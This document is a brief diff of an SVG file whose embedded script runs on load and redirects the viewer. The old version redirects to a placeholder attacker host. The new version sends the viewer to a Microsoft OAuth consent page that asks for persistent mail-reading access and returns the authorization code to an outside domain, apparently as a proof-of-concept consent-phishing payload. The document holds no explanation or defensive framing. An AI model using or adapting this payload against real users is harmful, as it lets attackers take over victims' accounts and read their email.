@@ -1,5 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    location="https://attacker.com";
+    location="https://login.live.com/oauth20_authorize.srf?client_id=3c6a01e0-c0a3-43ec-80d5-1a5bfb1142ce&scope=openid+profile+email+offline_access+https%3a%2f%2fgraph.microsoft.com%2fUser.Read+https%3a%2f%2fgraph.microsoft.com%2fMail.Read&redirect_uri=https%3a%2f%2fsupertestpoc.com%2fsso%2fmicrosoft%2fcallback&response_type=code&state=coop-poc&response_mode=query&prompt=consent&uaid=c96d9f4f5e774234b4b63869909e33ad&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&epctrc=xRTBvw5WpaZ8v5m5H4%2bQha8b3b3CIIw0oMkm0zFFLcM%3d9%3a1%3aCANARY%3aJNs2pa%2fu1PLxr8YjW4mLXWwrHIA9uACpuvpNk2gVmEo%3d&epct=PAQABDgEAAACvnsHKEvvRQb3Bz3Qc7wnaRXZvU3RzQXJ0aWZhY3RzCAAAAAAAAuTZA8G_79F0_z0l0O-kP-K7kAwWfkoiaef4D0xUiRjjZ5QfKLZNEdeH64grpVLNQ9CgamWHBlMlwkH526Uo3awkz-HcR0UulBuHfyHC6_9yLOpJtvxsKxHjkSq0-5DbRYTwDf1xx3tFnREFz2vMAGLga9S19iUxbw3Xp3G104Z46JVgo7J-0q7GDSDQs7saVhzk04A4BQI9gxD8M_4SiyAA&jshs=0#";
   </script>
 </svg>
